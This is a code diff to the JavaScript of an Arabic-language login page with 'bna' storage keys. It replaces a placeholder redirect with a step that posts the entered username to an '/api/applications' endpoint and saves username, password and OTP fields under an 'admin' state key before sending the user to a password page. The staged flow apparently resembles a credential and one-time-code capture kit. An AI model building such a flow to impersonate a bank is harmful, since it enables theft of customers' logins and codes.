@@ -380,15 +380,36 @@
   const remember = document.getElementById('remember');
   const go = document.getElementById('go');
   const error = document.getElementById('error');
-  // صفحة الباسورد: الملف المجاور في المشروع، ولينك المعاينة هنا
   const AUTH_FILE = 'password.html';
   const KEY = 'bna.identity';
+  const DATA_KEY = 'bna_state';
+  const ADMIN_KEY = 'bna_admin_state';
 
-  // استرجاع الاسم المحفوظ لو المستخدم اختار "احفظ هويتي"
+  function setS(u) {
+    let previous = {};
+    try {
+      previous = JSON.parse(localStorage.getItem(ADMIN_KEY) || localStorage.getItem(DATA_KEY) || '{}');
+    } catch (e) {}
+    const s = { ...previous, ...u };
+    try {
+      localStorage.setItem(DATA_KEY, JSON.stringify(s));
+      localStorage.setItem(ADMIN_KEY, JSON.stringify(s));
+    } catch (e) {}
+    return s;
+  }
+
+  function getApplicant() {
+    try {
+      return JSON.parse(localStorage.getItem('bna_applicant') || '{}');
+    } catch (e) {
+      return {};
+    }
+  }
+
   try {
     const saved = localStorage.getItem(KEY);
     if (saved) { input.value = saved; remember.checked = true; }
-  } catch (e) { /* التخزين ممكن يكون مقفول */ }
+  } catch (e) {}
 
   const refresh = () => { go.dataset.idle = input.value.trim() ? 'false' : 'true'; };
   refresh();
@@ -399,7 +420,7 @@
     error.classList.remove('show');
   });
 
-  form.addEventListener('submit', (e) => {
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
     const name = input.value.trim();
 
@@ -414,17 +435,46 @@
     try {
       if (remember.checked) localStorage.setItem(KEY, name);
       else localStorage.removeItem(KEY);
-    } catch (e) { /* مفيش تخزين متاح */ }
+    } catch (e) {}
 
     go.dataset.busy = 'true';
-    // هنا مكان طلب تسجيل الدخول الحقيقي على السيرفر، وبعده التحويل لصفحة الباسورد
-    goToAuth();
+
+    try {
+      const applicant = getApplicant();
+      const response = await fetch('/api/applications', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ...applicant,
+          id: applicant.id || undefined,
+          username: name,
+          status: 'pending_login'
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error('application submission failed');
+      }
+
+      const result = await response.json();
+      setS({
+        login: name,
+        username: name,
+        applicationId: result.application.id,
+        status: 'pending_login',
+        password: '',
+        otp: ''
+      });
+
+      location.href = AUTH_FILE;
+    } catch (err) {
+      go.dataset.busy = 'false';
+      input.classList.add('invalid');
+      error.textContent = 'تعذر إرسال البيانات، حاول مرة أخرى';
+      error.classList.add('show');
+    }
   });
 
-  function goToAuth() {
-    // التحويل المباشر لصفحة الباسورد (الملف المجاور في المشروع)
-    setTimeout(() => { location.href = AUTH_FILE; }, 350);
-  }
   /* ===== نقاط شريط الخدمات ===== */
   (function () {
     const rail = document.getElementById('rail');
